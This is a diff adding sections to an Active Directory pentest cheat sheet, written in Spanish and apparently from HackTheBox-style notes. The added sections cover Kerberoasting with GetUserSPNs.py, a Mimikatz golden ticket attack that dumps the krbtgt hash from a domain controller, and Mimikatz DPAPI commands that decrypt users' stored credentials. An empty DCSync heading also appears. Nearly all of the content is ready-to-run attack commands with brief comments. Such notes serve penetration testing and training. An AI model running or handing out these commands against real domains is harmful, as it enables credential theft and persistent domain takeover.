@@ -62,6 +62,15 @@ Rubeus.exe asreproast /ou:<OUName> /format:<hashcat|john> /domain:<DomainName> /
 #Trying the attack for the specified users on the file
 python GetNPUsers.py <domain_name>/ -usersfile <users_file> -outputfile <FileName>
 ```
+## Kerberoasting
+
+Todos los usuarios estándar del dominio pueden solicitar una copia de todas las cuentas de servicio junto con sus hashes de contraseña correspondientes.
+
+Por lo tanto, podemos solicitar un TGS para cualquier SPN que esté asociado a una cuenta de usuario, extraer el blob cifrado (que fue cifrado usando la contraseña del usuario) y luego realizar un ataque de fuerza bruta contra él de forma offline.
+
+```shell
+python GetUserSPNs.py <DomainName>/<DomainUser>:<Password> -outputfile <FileName>
+```
 
 ## Movimiento lateral
 
@@ -73,4 +82,42 @@ $Cred = New-Object System.Management.Automation.PSCredential('htb.local\<WtverUs
 Invoke-Command -ComputerName <WtverMachine> -Credential $Cred -ScriptBlock {whoami}
 ```
 
+## Domain Persistence
 
+### Golden ticket attack
+```shell
+#Execute mimikatz on DC as DA to grab krbtgt hash:
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName <DC'sName>
+
+#On any machine:
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<DomainName> /sid:<Domain's SID> /krbtgt:
+<HashOfkrbtgtAccount>   id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+```
+
+### DCsync Attack
+
+
+## List and Decrypt Stored Credentials using Mimikatz
+
+Generalmente las credenciales cifradas se almacenan en:
+
+- %appdata%\Microsoft\Credentials
+- %localappdata%\Microsoft\Credentials
+
+```shell
+#By using the cred function of mimikatz we can enumerate the cred object and get information about it:
+dpapi::cred /in:"%appdata%\Microsoft\Credentials\<CredHash>"
+
+#From the previous command we are interested to the "guidMasterKey" parameter, that tells us which masterkey was used to encrypt the credential
+#Lets enumerate the Master Key:
+dpapi::masterkey /in:"%appdata%\Microsoft\Protect\<usersid>\<MasterKeyGUID>"
+
+#Now if we are on the context of the user (or system) that the credential belogs to, we can use the /rpc flag to pass the decryption of the masterkey to the domain controler:
+dpapi::masterkey /in:"%appdata%\Microsoft\Protect\<usersid>\<MasterKeyGUID>" /rpc
+
+#We now have the masterkey in our local cache:
+dpapi::cache
+
+#Finally we can decrypt the credential using the cached masterkey:
+dpapi::cred /in:"%appdata%\Microsoft\Credentials\<CredHash>"
+```
